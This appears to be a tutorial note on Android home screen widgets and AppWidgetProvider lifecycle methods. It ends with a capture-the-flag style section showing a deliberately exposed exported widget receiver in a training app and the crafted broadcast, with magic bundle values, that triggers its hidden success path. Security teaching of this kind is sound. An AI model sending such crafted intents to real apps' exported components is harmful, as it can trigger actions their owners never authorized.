---
title: "Home screen app widgets"
---

Android home screen widgets are backed by a class that **extends** **[AppWidgetProvider](https://developer.android.com/reference/android/appwidget/AppWidgetProvider)**. `AppWidgetProvider` is actually a `BroadcastReceiver` under the hood.

This class is:

* Registered in the `AndroidManifest.xml`.
* Associated with a metadata XML file that defines widget size, update frequency, the layout XML used to draw the widget UI, etc.

There are several methods inside `AppWidgetProvider`:

* `onUpdate()`: This is the most important method and the one you will use most often. It is triggered at intervals defined by the `updatePeriodMillis` in the `AppWidgetProviderInfo` metadata file. It is also called when the user first adds the widget to the home screen.
* `onDeleted(Context, int[] appWidgetIds)`: called every time an instance of the widget is removed from the home screen by the user.
* `onEnabled(Context context)`: called when the very first instance of the widget is added to the home screen.
* `onDisabled(Context context)`: called when the last instance of your widget is removed from the home screen.
* `onReceive(Context, Intent)`: called on every broadcast intent. Generally developers don't need to override this. `AppWidgetProvider` is a subclass of `BroadcastReceiver`, and its default `onReceive` implementation parses the Intent and calls the appropriate method (like `onUpdate` or `onDeleted`).

Even if, developers rarely need to override `onReceive` because the parent class already handles routing the standard lifecycle intents, they would override it when the widgets needs to react to custom actions, such as a button click that performs a specific logic or a system broadcast like a time zone change.

Example:

```java
// Inside onUpdate
RemoteViews views = new RemoteViews(context.getPackageName(), R.layout.widget_layout);

// Create an Intent with a custom action string
Intent intent = new Intent(context, MyWidgetProvider.class);
intent.setAction("com.example.ACTION_WIDGET_CLICK");

// Wrap it in a PendingIntent
PendingIntent pendingIntent = PendingIntent.getBroadcast(
    context, 0, intent, PendingIntent.FLAG_IMMUTABLE
);

// Attach the click listener to a button in the layout
views.setOnClickPendingIntent(R.id.sync_button, pendingIntent);
```

```java
@Override
public void onReceive(Context context, Intent intent) {
    // 1. Always call super.onReceive first! 
    // This ensures onUpdate, onEnabled, etc., still function properly.
    super.onReceive(context, intent);

    // 2. Check if the intent matches our custom action
    if ("com.example.ACTION_WIDGET_CLICK".equals(intent.getAction())) {
        
        // Perform your custom logic here (e.g., show a Toast or start a service)
        Toast.makeText(context, "Button Clicked!", Toast.LENGTH_SHORT).show();
        
        // 3. Manually trigger a UI refresh if needed
        AppWidgetManager appWidgetManager = AppWidgetManager.getInstance(context);
        ComponentName thisAppWidget = new ComponentName(context.getPackageName(), MyWidgetProvider.class.getName());
        int[] appWidgetIds = appWidgetManager.getAppWidgetIds(thisAppWidget);
        
        // Trigger the onUpdate method manually to refresh the UI
        onUpdate(context, appWidgetManager, appWidgetIds);
    }
}
```

> **Note**: Widgets often have buttons (e.g., Play / Pause in a podcast widget). Clicking a widget button it sends a broadcast via a **PendingIntent**. This is because widgets are displayed inside another app (usually the launcher). The launcher is the one detecting the click and to avoid running code with launcher permissions, Android uses a `PendingIntent` that ensures the broadcast runs with the podcast app’s permissions, not the launcher’s.

**Attack surface: Developers can override `onReceive()` and add custom logic for other broadcast intents.**

Let’s say that the app io.hextree.attacksurface has the following widget:

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag19Widget" android:exported="true">
    <intent-filter>
        <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
    </intent-filter>
    <meta-data
        android:name="android.appwidget.provider"
        android:resource="@xml/flag_home_widget_info"/>
</receiver>
```

```java
public class Flag19Widget extends AppWidgetProvider {
    @Override
    public void onDisabled(Context context) {...}

    @Override
    public void onEnabled(Context context) {...}

    static void updateAppWidget(Context context, AppWidgetManager appWidgetManager, int i) {...}

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundleExtra;
        Log.i("Flag19Widget.onReceive", Utils.dumpIntent(context, intent));
        super.onReceive(context, intent);
        String action = intent.getAction();
        if (action == null || !action.contains("APPWIDGET_UPDATE") || (bundleExtra = intent.getBundleExtra("appWidgetOptions")) == null) {
            return;
        }
        int i = bundleExtra.getInt("appWidgetMaxHeight", -1);
        int i2 = bundleExtra.getInt("appWidgetMinHeight", -1);
        if (i == 1094795585 && i2 == 322376503) {
            success(context);
        }
    }

    private void success(Context context) {...}

    @Override
    public void onUpdate(Context context, AppWidgetManager appWidgetManager, int[] iArr) {...}

    public static Intent refreshIntent(Context context) {...}
}
```

To trigger the success method we have to send a broadcast like the following:

```java
Bundle bundle = new Bundle();
bundle.putInt("appWidgetMaxHeight", 1094795585);
bundle.putInt("appWidgetMinHeight", 322376503);

Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget");
intent.setAction("test.APPWIDGET_UPDATE");
intent.putExtra("appWidgetOptions", bundle);

sendBroadcast(intent);
```